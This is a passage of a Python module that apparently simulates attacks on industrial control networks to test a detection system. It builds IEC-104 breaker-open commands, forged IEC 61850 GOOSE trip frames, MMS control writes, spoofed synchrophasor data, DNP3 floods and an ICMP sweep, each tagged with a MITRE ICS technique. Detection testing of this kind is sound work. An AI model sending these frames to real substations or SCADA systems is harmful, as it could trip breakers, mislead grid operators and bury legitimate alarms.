    Simulates lateral movement by generating protocol traffic between
    two OT devices that wouldn't normally talk to each other.
    CV should detect: new communication pair, anomalous traffic pattern.
    """
    count = params.get("count", 5)
    interval_ms = params.get("interval_ms", 1000)
    params.get("target_type", "plc")

    if len(targets) < 2:
        return

    current_time = start_time_ms
    tid = random.randint(1, 65535)

    # Pick two random devices as source and destination
    src_device, dst_device = random.sample(targets[:min(len(targets), 5)], 2)

    for i in range(count):
        # Build a Modbus read request from one device to another
        pdu = struct.pack(">BHH", 0x03, random.randint(0, 1000), 10)
        payload = _build_mbap(tid, 1, pdu)
        pkt = _build_modbus_raw_packet(
            src_device.ip_address,
            dst_device.ip_address,
            payload,
        )
        yield _scapy_to_packet_event(current_time, pkt, "cross_device_comm", {
            "src_device": src_device.device_id,
            "dst_device": dst_device.device_id,
            "mitre_technique": "T0867",
        })
        tid = (tid + 1) & 0xFFFF
        current_time += interval_ms + random.randint(-100, 100)


# ---------------------------------------------------------------------------
# ICMP reconnaissance
# ---------------------------------------------------------------------------


@register_action("icmp_sweep")
def _icmp_sweep(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """ICMP echo request sweep — host discovery.

    CV should detect: ICMP sweep, network reconnaissance.
    """
    from scapy.layers.inet import ICMP

    interval_ms = params.get("interval_ms", 100)
    current_time = start_time_ms
    icmp_id = random.randint(0, 65535)

    for i, target in enumerate(targets):
        pkt = (
            Ether()
            / IP(src=attacker_ip, dst=target.ip_address)
            / ICMP(type=8, code=0, id=icmp_id, seq=i + 1)
        )
        yield _scapy_to_packet_event(current_time, pkt, "icmp_sweep", {
            "target_ip": target.ip_address,
            "mitre_technique": "T0846",
        })
        current_time += interval_ms + random.randint(-10, 10)


# ---------------------------------------------------------------------------
# SNMP BER encoding helpers (minimal, for generating realistic wire traffic)
# ---------------------------------------------------------------------------


def _ber_encode_length(length: int) -> bytes:
    """BER length encoding."""
    if length < 0x80:
        return bytes([length])
    elif length < 0x100:
        return bytes([0x81, length])
    else:
        return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])


def _ber_encode_integer(value: int) -> bytes:
    """BER integer encoding (tag 0x02)."""
    if value < 0x80:
        return bytes([0x02, 0x01, value & 0xFF])
    elif value < 0x8000:
        return bytes([0x02, 0x02, (value >> 8) & 0xFF, value & 0xFF])
    else:
        return bytes([0x02, 0x04,
                       (value >> 24) & 0xFF, (value >> 16) & 0xFF,
                       (value >> 8) & 0xFF, value & 0xFF])


def _ber_encode_string(s: str) -> bytes:
    """BER octet string encoding (tag 0x04)."""
    data = s.encode("ascii")
    return bytes([0x04]) + _ber_encode_length(len(data)) + data


def _ber_encode_oid(parts: list[int]) -> bytes:
    """BER OID encoding (tag 0x06)."""
    if len(parts) < 2:
        parts = parts + [0] * (2 - len(parts))
    oid_bytes = bytes([parts[0] * 40 + parts[1]])
    for p in parts[2:]:
        if p < 0x80:
            oid_bytes += bytes([p])
        elif p < 0x4000:
            oid_bytes += bytes([(p >> 7) | 0x80, p & 0x7F])
        else:
            oid_bytes += bytes([
                (p >> 14) | 0x80, ((p >> 7) & 0x7F) | 0x80, p & 0x7F
            ])
    return bytes([0x06]) + _ber_encode_length(len(oid_bytes)) + oid_bytes


def _build_snmp_get_bulk(
    community: str,
    request_id: int,
    oid_parts: list[int],
    max_repetitions: int = 10,
) -> bytes:
    """Build an SNMPv2c GetBulk-Request PDU."""
    # VarBind: OID + NULL value
    oid_enc = _ber_encode_oid(oid_parts)
    null_val = bytes([0x05, 0x00])  # ASN.1 NULL
    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(null_val)) + oid_enc + null_val
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind

    # GetBulk-Request PDU (tag 0xA5)
    req_id = _ber_encode_integer(request_id)
    non_repeaters = _ber_encode_integer(0)
    max_rep = _ber_encode_integer(max_repetitions)
    pdu_content = req_id + non_repeaters + max_rep + varbind_list
    pdu = bytes([0xA5]) + _ber_encode_length(len(pdu_content)) + pdu_content

    # SNMP message: version + community + PDU
    version = _ber_encode_integer(1)  # SNMPv2c
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


def _build_snmp_get_request(
    community: str,
    request_id: int,
    oid_parts: list[int],
) -> bytes:
    """Build an SNMPv2c Get-Request PDU."""
    oid_enc = _ber_encode_oid(oid_parts)
    null_val = bytes([0x05, 0x00])
    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(null_val)) + oid_enc + null_val
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind

    # Get-Request PDU (tag 0xA0)
    req_id = _ber_encode_integer(request_id)
    error_status = _ber_encode_integer(0)
    error_index = _ber_encode_integer(0)
    pdu_content = req_id + error_status + error_index + varbind_list
    pdu = bytes([0xA0]) + _ber_encode_length(len(pdu_content)) + pdu_content

    version = _ber_encode_integer(1)
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


def _build_snmp_set_request(
    community: str,
    request_id: int,
    oid_parts: list[int],
    value: str,
) -> bytes:
    """Build an SNMPv2c Set-Request PDU."""
    oid_enc = _ber_encode_oid(oid_parts)
    val_enc = _ber_encode_string(value)
    varbind = bytes([0x30]) + _ber_encode_length(len(oid_enc) + len(val_enc)) + oid_enc + val_enc
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind)) + varbind

    # Set-Request PDU (tag 0xA3)
    req_id = _ber_encode_integer(request_id)
    error_status = _ber_encode_integer(0)
    error_index = _ber_encode_integer(0)
    pdu_content = req_id + error_status + error_index + varbind_list
    pdu = bytes([0xA3]) + _ber_encode_length(len(pdu_content)) + pdu_content

    version = _ber_encode_integer(1)
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


def _build_snmp_v2c_trap(
    community: str,
    request_id: int,
    trap_oid_parts: list[int],
    uptime_cs: int,
) -> bytes:
    """Build an SNMPv2c Trap PDU (InformRequest-style)."""
    # VarBind 1: sysUpTime.0
    uptime_oid = _ber_encode_oid([1, 3, 6, 1, 2, 1, 1, 3, 0])
    # TimeTicks value (tag 0x43)
    uptime_bytes = struct.pack(">I", uptime_cs)
    uptime_val = bytes([0x43]) + _ber_encode_length(len(uptime_bytes)) + uptime_bytes
    vb1 = bytes([0x30]) + _ber_encode_length(len(uptime_oid) + len(uptime_val)) + uptime_oid + uptime_val

    # VarBind 2: snmpTrapOID.0
    trap_oid_enc = _ber_encode_oid([1, 3, 6, 1, 6, 3, 1, 1, 4, 1, 0])
    trap_val = _ber_encode_oid(trap_oid_parts)
    vb2 = bytes([0x30]) + _ber_encode_length(len(trap_oid_enc) + len(trap_val)) + trap_oid_enc + trap_val

    varbind_data = vb1 + vb2
    varbind_list = bytes([0x30]) + _ber_encode_length(len(varbind_data)) + varbind_data

    # SNMPv2-Trap PDU (tag 0xA7)
    req_id = _ber_encode_integer(request_id)
    error_status = _ber_encode_integer(0)
    error_index = _ber_encode_integer(0)
    pdu_content = req_id + error_status + error_index + varbind_list
    pdu = bytes([0xA7]) + _ber_encode_length(len(pdu_content)) + pdu_content

    version = _ber_encode_integer(1)
    comm = _ber_encode_string(community)
    msg_content = version + comm + pdu
    return bytes([0x30]) + _ber_encode_length(len(msg_content)) + msg_content


# ---------------------------------------------------------------------------
# BACnet packet building helpers
# ---------------------------------------------------------------------------


def _build_bacnet_ip_frame(apdu: bytes, *, broadcast: bool = False) -> bytes:
    """Wrap a BACnet APDU in BVLC + NPDU for BACnet/IP transport."""
    # NPDU: version=1, control depends on broadcast
    if broadcast:
        npdu = bytes([0x01, 0x20, 0xFF, 0xFF, 0x00, 0xFF])
    else:
        npdu = bytes([0x01, 0x04])  # version=1, expecting-reply
    total = 4 + len(npdu) + len(apdu)
    func = 0x0B if broadcast else 0x0A  # original-broadcast vs original-unicast
    bvlc = bytes([0x81, func, (total >> 8) & 0xFF, total & 0xFF])
    return bvlc + npdu + apdu


def _bacnet_encode_object_id(object_type: int, instance: int) -> bytes:
    """Encode a BACnet object identifier as 4 bytes (type:10 bits, instance:22 bits)."""
    value = ((object_type & 0x3FF) << 22) | (instance & 0x3FFFFF)
    return struct.pack(">I", value)


def _bacnet_context_tag(tag_number: int, data: bytes) -> bytes:
    """Build a BACnet context-specific tag with enclosed data."""
    length = len(data)
    if length < 5:
        return bytes([(tag_number << 4) | 0x08 | length]) + data
    else:
        return bytes([(tag_number << 4) | 0x0D, length]) + data


def _build_bacnet_read_property_apdu(
    invoke_id: int,
    object_type: int,
    instance: int,
    property_id: int,
) -> bytes:
    """Build a BACnet Confirmed-Request ReadProperty APDU."""
    # PDU type 0 = confirmed-request, service 12 = ReadProperty
    header = bytes([0x00, 0x04, invoke_id, 0x0C])  # max-segs=0, max-resp=1476
    # Context 0: objectIdentifier
    obj_id = _bacnet_encode_object_id(object_type, instance)
    tag0 = _bacnet_context_tag(0, obj_id)
    # Context 1: propertyIdentifier
    if property_id < 256:
        tag1 = _bacnet_context_tag(1, bytes([property_id]))
    else:
        tag1 = _bacnet_context_tag(1, struct.pack(">H", property_id))
    return header + tag0 + tag1


def _build_bacnet_write_property_apdu(
    invoke_id: int,
    object_type: int,
    instance: int,
    property_id: int,
    value: float,
) -> bytes:
    """Build a BACnet Confirmed-Request WriteProperty APDU."""
    # PDU type 0 = confirmed-request, service 15 = WriteProperty
    header = bytes([0x00, 0x04, invoke_id, 0x0F])
    # Context 0: objectIdentifier
    obj_id = _bacnet_encode_object_id(object_type, instance)
    tag0 = _bacnet_context_tag(0, obj_id)
    # Context 1: propertyIdentifier
    if property_id < 256:
        tag1 = _bacnet_context_tag(1, bytes([property_id]))
    else:
        tag1 = _bacnet_context_tag(1, struct.pack(">H", property_id))
    # Context 3: propertyValue (opening tag + REAL + closing tag)
    real_bytes = struct.pack(">f", value)
    # Application tag 4 = REAL, length 4
    app_real = bytes([0x44]) + real_bytes
    opening = bytes([(3 << 4) | 0x0E])  # context 3 opening tag
    closing = bytes([(3 << 4) | 0x0F])  # context 3 closing tag
    tag3 = opening + app_real + closing
    # Context 4: priority (optional, use 8 = manual operator)
    tag4 = _bacnet_context_tag(4, bytes([8]))
    return header + tag0 + tag1 + tag3 + tag4


def _build_bacnet_iam_apdu(
    device_instance: int,
    max_apdu: int = 1476,
    vendor_id: int = 0,
) -> bytes:
    """Build a BACnet Unconfirmed I-Am APDU."""
    # PDU type 1 = unconfirmed, service 0 = I-Am
    header = bytes([0x10, 0x00])
    # objectIdentifier (application tag 12, length 4)
    obj_id = _bacnet_encode_object_id(8, device_instance)  # type 8 = device
    app_obj = bytes([0xC4]) + obj_id
    # maxAPDUlength (application tag 2 = unsigned)
    if max_apdu < 256:
        app_max = bytes([0x21, max_apdu & 0xFF])
    else:
        app_max = bytes([0x22, (max_apdu >> 8) & 0xFF, max_apdu & 0xFF])
    # segmentationSupported (application tag 9 = enumerated, 0 = both)
    app_seg = bytes([0x91, 0x00])
    # vendorID (application tag 2 = unsigned)
    if vendor_id < 256:
        app_vendor = bytes([0x21, vendor_id & 0xFF])
    else:
        app_vendor = bytes([0x22, (vendor_id >> 8) & 0xFF, vendor_id & 0xFF])
    return header + app_obj + app_max + app_seg + app_vendor


# ---------------------------------------------------------------------------
# Power-grid protocol helpers (IEC 60870-5-104, IEC 61850, IEEE C37.118, DNP3)
# ---------------------------------------------------------------------------


def _build_tcp_raw_packet(
    src_ip: str,
    dst_ip: str,
    payload: bytes,
    dst_port: int,
    src_port: int = 0,
) -> bytes:
    """Build a raw TCP Ethernet frame for arbitrary protocol payloads."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / TCP(sport=src_port, dport=dst_port, flags="PA",
              seq=random.randint(1000, 0xFFFFFF),
              ack=random.randint(1000, 0xFFFFFF))
        / Raw(load=payload)
    )
    return pkt


def _build_udp_raw_packet(
    src_ip: str,
    dst_ip: str,
    payload: bytes,
    dst_port: int,
    src_port: int = 0,
) -> bytes:
    """Build a raw UDP Ethernet frame for arbitrary protocol payloads."""
    if src_port == 0:
        src_port = random.randint(49152, 65535)
    pkt = (
        Ether()
        / IP(src=src_ip, dst=dst_ip)
        / UDP(sport=src_port, dport=dst_port)
        / Raw(load=payload)
    )
    return pkt


def _build_l2_goose_frame(
    src_mac: str,
    payload: bytes,
    dst_mac: str = "01:0C:CD:01:00:01",
) -> bytes:
    """Build a Layer-2-only IEC 61850 GOOSE Ethernet frame.

    GOOSE uses EtherType 0x88B8 and is published as multicast to the
    standard reserved range ``01:0C:CD:01:00:00`` – ``01:0C:CD:01:01:FF``.
    """
    pkt = Ether(src=src_mac, dst=dst_mac, type=0x88B8) / Raw(load=payload)
    return pkt


def _build_iec104_apci(
    apdu_body: bytes,
    tx_seq: int,
    rx_seq: int,
) -> bytes:
    """Build an IEC 60870-5-104 I-format APCI + body.

    Format: 0x68 | length | (tx_seq<<1) | (rx_seq<<1) | body
    Sequence numbers are 15-bit; the LSB of each 16-bit field is 0
    for I-format frames.
    """
    length = 4 + len(apdu_body)  # 4 control bytes + body
    tx = (tx_seq & 0x7FFF) << 1
    rx = (rx_seq & 0x7FFF) << 1
    apci = struct.pack(">BBHH", 0x68, length, tx, rx)
    return apci + apdu_body


def _crc_ccitt(data: bytes) -> int:
    """CRC-CCITT (poly 0x1021, init 0xFFFF) used by IEEE C37.118 frames."""
    crc = 0xFFFF
    for b in data:
        crc ^= (b << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc


# ---------------------------------------------------------------------------
# IEC 60870-5-104 attack actions (TCP/2404)
# ---------------------------------------------------------------------------


@register_action("iec104_breaker_open")
def _iec104_breaker_open(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Send IEC-104 I-format single command (C_SC_NA_1, type 46) to open a breaker.

    Targets a substation breaker via its information object address. SCO
    qualifier 0x81 = select-and-execute, OFF→ON transition representing
    a remote open.
    CV should detect: unauthorized C_SC_NA_1 command, remote breaker
    operation from non-SCADA source.
    """
    unit_address = int(params.get("unit_address", 1))
    ioa = int(params.get("ioa", 1001))
    count = int(params.get("count", 1))
    interval_ms = int(params.get("interval_ms", 500))

    current_time = start_time_ms
    tx_seq = random.randint(0, 0x7FFF)
    rx_seq = random.randint(0, 0x7FFF)

    for target in targets:
        for i in range(count):
            # ASDU: typeID=46 (C_SC_NA_1), VSQ=1 (single IO), COT=6 (Act),
            # originator=0, common_addr (2 bytes), IOA (3 bytes), SCO (1)
            ioa_bytes = struct.pack("<I", ioa & 0xFFFFFF)[:3]
            asdu = (
                struct.pack(
                    "<BBBBH",
                    46,            # typeID = C_SC_NA_1
                    1,             # VSQ: SQ=0, count=1
                    6,             # COT = Activation
                    0,             # originator addr
                    unit_address,  # common addr
                )
                + ioa_bytes
                + bytes([0x81])    # SCO: select+execute, command state ON
            )
            apdu = _build_iec104_apci(asdu, tx_seq, rx_seq)
            pkt = _build_tcp_raw_packet(
                attacker_ip, target.ip_address, apdu, dst_port=2404,
            )
            yield _scapy_to_packet_event(current_time, pkt, "iec104_breaker_open", {
                "target_ip": target.ip_address,
                "unit_address": unit_address,
                "ioa": ioa,
                "type_id": 46,
                "cot": 6,
                "mitre_technique": "T0855",
            })
            tx_seq = (tx_seq + 1) & 0x7FFF
            current_time += interval_ms + random.randint(-50, 50)


@register_action("iec104_select_before_operate_abuse")
def _iec104_select_before_operate_abuse(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Rapid IEC-104 select-then-execute pairs against a protection relay.

    Issues C_SC_NA_1 with COT=7 (Activation Confirmation / Select) then
    COT=10 (Activation Termination / Execute) as fast as possible to
    overwhelm a relay's command-handling state machine.
    CV should detect: SBO storm, abnormal C_SC_NA_1 rate.
    """
    pairs = int(params.get("pairs", 20))
    interval_ms = int(params.get("interval_ms", 50))
    unit_address = int(params.get("unit_address", 1))
    ioa = int(params.get("ioa", 1001))

    current_time = start_time_ms
    tx_seq = random.randint(0, 0x7FFF)
    rx_seq = random.randint(0, 0x7FFF)
    ioa_bytes = struct.pack("<I", ioa & 0xFFFFFF)[:3]

    for target in targets:
        for _ in range(pairs):
            for cot in (7, 10):  # 7=Select-confirm, 10=Execute
                asdu = (
                    struct.pack(
                        "<BBBBH",
                        46,            # typeID = C_SC_NA_1
                        1,             # VSQ
                        cot,           # COT
                        0,             # originator
                        unit_address,  # common addr
                    )
                    + ioa_bytes
                    + bytes([0x81])
                )
                apdu = _build_iec104_apci(asdu, tx_seq, rx_seq)
                pkt = _build_tcp_raw_packet(
                    attacker_ip, target.ip_address, apdu, dst_port=2404,
                )
                yield _scapy_to_packet_event(
                    current_time, pkt, "iec104_select_before_operate_abuse", {
                        "target_ip": target.ip_address,
                        "unit_address": unit_address,
                        "ioa": ioa,
                        "cot": cot,
                        "mitre_technique": "T0855",
                    },
                )
                tx_seq = (tx_seq + 1) & 0x7FFF
                current_time += interval_ms + random.randint(-10, 10)


# ---------------------------------------------------------------------------
# IEC 61850 attack actions
# ---------------------------------------------------------------------------


@register_action("iec61850_goose_spoof")
def _iec61850_goose_spoof(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Forge GOOSE multicast frames impersonating a trusted IED.

    Layer-2 only — sent to standard GOOSE multicast MAC
    ``01:0C:CD:01:00:01`` with EtherType 0x88B8. Uses an ``IECGoosePDU``
    tag (0x61) wrapping a credible-looking but not strictly
    spec-compliant ASN.1-BER payload. Spoofed ``stNum`` increments
    quickly to override the legitimate publisher.
    CV should detect: duplicate gocbRef from new MAC, GOOSE stNum
    inconsistency.
    """
    goose_id = str(params.get("goose_id", "MICOM_E01CTRL/LLN0$GO$gcb01"))
    dataset_ref = str(params.get("dataset_ref", "MICOM_E01CTRL/LLN0$dsTrip"))
    state_num = int(params.get("state_num", 1))
    sq_num = int(params.get("sq_num", 0))
    count = int(params.get("count", 50))
    interval_ms = int(params.get("interval_ms", 20))

    current_time = start_time_ms
    # Spoofed source MAC — pick a credible Schneider/Siemens-ish OUI
    src_mac = "00:80:F4:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
    )

    def _ber_visible_string(s: str, tag: int = 0x83) -> bytes:
        data = s.encode("ascii")
        return bytes([tag]) + _ber_encode_length(len(data)) + data

    def _ber_uint(value: int, tag: int) -> bytes:
        if value < 0x80:
            payload = bytes([value & 0xFF])
        elif value < 0x10000:
            payload = struct.pack(">H", value)
        else:
            payload = struct.pack(">I", value)
        return bytes([tag]) + _ber_encode_length(len(payload)) + payload

    for target in targets:
        cur_state = state_num
        cur_sq = sq_num
        for _ in range(count):
            # Minimal GOOSE PDU components (context-specific tags)
            # 0x80 gocbRef, 0x81 timeAllowedToLive, 0x82 datSet,
            # 0x83 goID, 0x84 t (timestamp), 0x85 stNum,
            # 0x86 sqNum, 0x87 test, 0x88 confRev, 0x89 ndsCom,
            # 0x8A numDatSetEntries, 0xAB allData
            goose_pdu = b""
            goose_pdu += _ber_visible_string(goose_id, tag=0x80)
            goose_pdu += _ber_uint(2000, tag=0x81)  # timeAllowedToLive (ms)
            goose_pdu += _ber_visible_string(dataset_ref, tag=0x82)
            goose_pdu += _ber_visible_string(goose_id, tag=0x83)
            # Fake UTC time = 8 bytes
            ts_bytes = struct.pack(">II", int(current_time / 1000), 0)
            goose_pdu += bytes([0x84]) + _ber_encode_length(len(ts_bytes)) + ts_bytes
            goose_pdu += _ber_uint(cur_state, tag=0x85)
            goose_pdu += _ber_uint(cur_sq, tag=0x86)
            goose_pdu += bytes([0x87, 0x01, 0x00])  # test=false
            goose_pdu += _ber_uint(1, tag=0x88)     # confRev
            goose_pdu += bytes([0x89, 0x01, 0x00])  # ndsCom=false
            goose_pdu += _ber_uint(1, tag=0x8A)     # numDatSetEntries
            # allData: one boolean = true (trip!)
            all_data = bytes([0x83, 0x01, 0xFF])  # boolean TRUE
            goose_pdu += bytes([0xAB]) + _ber_encode_length(len(all_data)) + all_data

            # Wrap in IECGoosePDU (tag 0x61)
            iec_pdu = bytes([0x61]) + _ber_encode_length(len(goose_pdu)) + goose_pdu

            # GOOSE Ethernet payload header (APPID, length, reserved1, reserved2)
            appid = 0x0001
            goose_len = 8 + len(iec_pdu)  # header (8) + APDU
            goose_header = struct.pack(">HHHH", appid, goose_len, 0x0000, 0x0000)
            l2_payload = goose_header + iec_pdu

            pkt = _build_l2_goose_frame(src_mac, l2_payload)
            yield _scapy_to_packet_event(current_time, pkt, "iec61850_goose_spoof", {
                "spoofed_src_mac": src_mac,
                "goose_id": goose_id,
                "dataset_ref": dataset_ref,
                "st_num": cur_state,
                "sq_num": cur_sq,
                "mitre_technique": "T0830",
            })
            cur_sq += 1
            if cur_sq > 50:
                cur_state += 1
                cur_sq = 0
            current_time += interval_ms + random.randint(-3, 3)


@register_action("iec61850_mms_write")
def _iec61850_mms_write(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """MMS Write request over TCP/102 targeting a controllable data attribute.

    Builds TPKT + COTP + MMS-ish bytes with a confirmed-request tag
    (0xA1) carrying a loosely encoded Write service. Target path is
    embedded as a visible string so packet capture matches the IEC
    61850 functional constraint format (e.g. ``GGIO1$CO$SPCSO1$Oper``).
    CV should detect: MMS Write to ``$CO$`` (control) data object.
    """
    target_path = str(params.get("target_path", "GGIO1$CO$SPCSO1$Oper"))
    count = int(params.get("count", 5))
    interval_ms = int(params.get("interval_ms", 400))

    current_time = start_time_ms
    invoke_id = random.randint(1, 0x7FFFFFFF)

    for target in targets:
        for _ in range(count):
            # MMS confirmed-request (tag 0xA1) carrying a Write service
            # Service 5 = Write (context-specific [5])
            path_bytes = target_path.encode("ascii")
            # ObjectName domain-specific: tag 0xA1 (domain-id + item-id)
            domain_id = b"CTRL"
            object_name = (
                bytes([0xA1])
                + _ber_encode_length(2 + len(domain_id) + 2 + len(path_bytes))
                + bytes([0x1A]) + _ber_encode_length(len(domain_id)) + domain_id
                + bytes([0x1A]) + _ber_encode_length(len(path_bytes)) + path_bytes
            )
            # VariableSpecification: [0] name
            var_spec = bytes([0xA0]) + _ber_encode_length(len(object_name)) + object_name
            # ListOfVariable: [0] SEQUENCE OF VariableSpecification
            list_of_var = (
                bytes([0xA0])
                + _ber_encode_length(len(var_spec))
                + var_spec
            )
            # ListOfData: [0] one Boolean TRUE (trip command)
            data_item = bytes([0x83, 0x01, 0xFF])  # boolean TRUE
            list_of_data = (
                bytes([0xA0])
                + _ber_encode_length(len(data_item))
                + data_item
            )
            # Write-Request ::= SEQUENCE { variableAccessSpec, listOfData }
            # Wrapped in service [5]
            write_body = list_of_var + list_of_data
            write_service = bytes([0xA5]) + _ber_encode_length(len(write_body)) + write_body
            # invokeID
            invoke_bytes = struct.pack(">I", invoke_id & 0xFFFFFFFF)
            invoke_tag = bytes([0x02]) + _ber_encode_length(len(invoke_bytes)) + invoke_bytes
            confirmed_body = invoke_tag + write_service
            mms_pdu = bytes([0xA1]) + _ber_encode_length(len(confirmed_body)) + confirmed_body

            # COTP DT TPDU
            cotp = bytes([0x02, 0xF0, 0x80])
            # TPKT header
            total_len = 4 + len(cotp) + len(mms_pdu)
            tpkt = struct.pack(">BBH", 0x03, 0x00, total_len)
            payload = tpkt + cotp + mms_pdu

            pkt = _build_tcp_raw_packet(
                attacker_ip, target.ip_address, payload, dst_port=102,
            )
            yield _scapy_to_packet_event(current_time, pkt, "iec61850_mms_write", {
                "target_ip": target.ip_address,
                "target_path": target_path,
                "invoke_id": invoke_id,
                "mitre_technique": "T0855",
            })
            invoke_id = (invoke_id + 1) & 0x7FFFFFFF
            current_time += interval_ms + random.randint(-40, 40)


# ---------------------------------------------------------------------------
# IEEE C37.118 (synchrophasor) attack actions
# ---------------------------------------------------------------------------


@register_action("c37118_phasor_spoof")
def _c37118_phasor_spoof(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Forge IEEE C37.118 DATA frames over UDP/4713 with manipulated values.

    Targets a Phasor Data Concentrator (PDC). Sets ``FREQ`` deviation to
    encode an abnormal under-frequency reading (default 47.5 Hz vs
    nominal 50 Hz) and spoofs the ``IDCODE`` of a legitimate PMU.
    Frame structure: SYNC(2) + FRAMESIZE(2) + IDCODE(2) + SOC(4) +
    FRACSEC(4) + STAT(2) + PHASORS(8 each) + FREQ(2) + DFREQ(2) +
    CRC-CCITT(2).
    CV should detect: PMU value drift, IDCODE collision, abnormal
    frequency deviation.
    """
    idcode = int(params.get("idcode", 1)) & 0xFFFF
    freq_hz = float(params.get("freq_hz", 47.5))
    fnom = float(params.get("fnom", 50.0))
    count = int(params.get("count", 30))
    interval_ms = int(params.get("interval_ms", 33))  # ~30 fps
    num_phasors = int(params.get("num_phasors", 1))

    current_time = start_time_ms

    for target in targets:
        for i in range(count):
            soc = int(current_time / 1000) & 0xFFFFFFFF
            # FRACSEC: top byte = time quality, lower 24 bits = fractional sec
            fracsec = (random.randint(0, 0xFFFFFF)) & 0xFFFFFF
            stat = 0x0000  # all OK
            # PHASORS: real + imag floats (rectangular, IEEE 754 float32)
            phasors = b""
            for _ in range(num_phasors):
                real = random.uniform(-1.0, 1.0) * 7200.0  # V phase voltage
                imag = random.uniform(-1.0, 1.0) * 7200.0
                phasors += struct.pack(">ff", real, imag)
            # FREQ = (freq_hz - fnom) * 1000 as int16
            freq_int = int((freq_hz - fnom) * 1000.0)
            freq_int = max(-32768, min(32767, freq_int))
            dfreq = 0  # rate of change of frequency
            # Build frame body (without SYNC, FRAMESIZE, CRC)
            body = struct.pack(">HII", idcode, soc, fracsec)
            body += struct.pack(">H", stat)
            body += phasors
            body += struct.pack(">hh", freq_int, dfreq)

            # SYNC = 0xAA01 (data frame, version 1)
            sync = 0xAA01
            framesize = 2 + 2 + len(body) + 2  # SYNC + FRAMESIZE + body + CRC
            head = struct.pack(">HH", sync, framesize)
            crc_input = head + body
            crc = _crc_ccitt(crc_input)
            frame = head + body + struct.pack(">H", crc)

            pkt = _build_udp_raw_packet(
                attacker_ip, target.ip_address, frame, dst_port=4713,
            )
            yield _scapy_to_packet_event(current_time, pkt, "c37118_phasor_spoof", {
                "target_ip": target.ip_address,
                "spoofed_idcode": idcode,
                "freq_hz": freq_hz,
                "frame_index": i,
                "mitre_technique": "T0830",
            })
            current_time += interval_ms + random.randint(-2, 2)


# ---------------------------------------------------------------------------
# DNP3 attack actions (TCP/20000)
# ---------------------------------------------------------------------------


@register_action("dnp3_unsolicited_flood")
def _dnp3_unsolicited_flood(
    params: dict[str, Any],
    targets: list[TargetInfo],
    attacker_ip: str,
    start_time_ms: float,
) -> Iterator[PacketEvent]:
    """Flood a DNP3 master with unsolicited responses over TCP/20000.

    Builds minimal DNP3 link-layer frames (start bytes 0x05 0x64) with
    transport + application headers indicating an unsolicited response
    (function code 0x82). Designed to overwhelm a SCADA master's event
    queue and obscure legitimate alarms.
    CV should detect: DNP3 unsolicited flood, abnormal event rate.
    """
    count = int(params.get("count", 200))
    interval_ms = int(params.get("interval_ms", 20))
    src_addr = int(params.get("src_addr", 1024))
    dst_addr = int(params.get("dst_addr", 1))

    current_time = start_time_ms
    app_seq = 0

    for target in targets:
        for i in range(count):
            # Link layer header (10 bytes):
            #   start: 0x05 0x64
            #   length: 1 byte (count from CTRL through user data, +1)
            #   ctrl: 1 byte (DIR=1, PRM=1, FCB=0, FCV=0, FC=0x4 unconfirmed user data)
            #   dst: 2 bytes (LSB first)
            #   src: 2 bytes (LSB first)
            #   crc: 2 bytes (omitted/zeroed for sim purposes)
            # Transport (1 byte): FIN=1, FIR=1, SEQ
            # Application (3 bytes): control (CON=0, UNS=1, SEQ), func=0x82,
            #   IIN (2 bytes)
            transport = 0xC0 | (i & 0x3F)
            app_ctrl = 0xD0 | (app_seq & 0x0F)  # FIR=1, FIN=1, UNS=1
            app_func = 0x82  # Unsolicited response
            iin = struct.pack(">H", 0x0000)
            user_data = bytes([transport, app_ctrl, app_func]) + iin
            # length covers ctrl + dst + src + user_data + transport-CRCs (sim: omit)
            link_length = 5 + len(user_data)
            link_ctrl = 0x44  # DIR=0, PRM=1, FC=4 (unconfirmed user data)
            link_header = (
                bytes([0x05, 0x64, link_length & 0xFF, link_ctrl])
                + struct.pack("<HH", dst_addr & 0xFFFF, src_addr & 0xFFFF)
                + struct.pack(">H", 0x0000)  # link CRC (zeroed)
            )
            frame = link_header + user_data

            pkt = _build_tcp_raw_packet(
                attacker_ip, target.ip_address, frame, dst_port=20000,
            )
            yield _scapy_to_packet_event(current_time, pkt, "dnp3_unsolicited_flood", {
                "target_ip": target.ip_address,
                "src_addr": src_addr,
                "dst_addr": dst_addr,
                "func_code": app_func,
                "mitre_technique": "T0814",
            })
            app_seq = (app_seq + 1) & 0x0F
            current_time += interval_ms + random.randint(-3, 3)
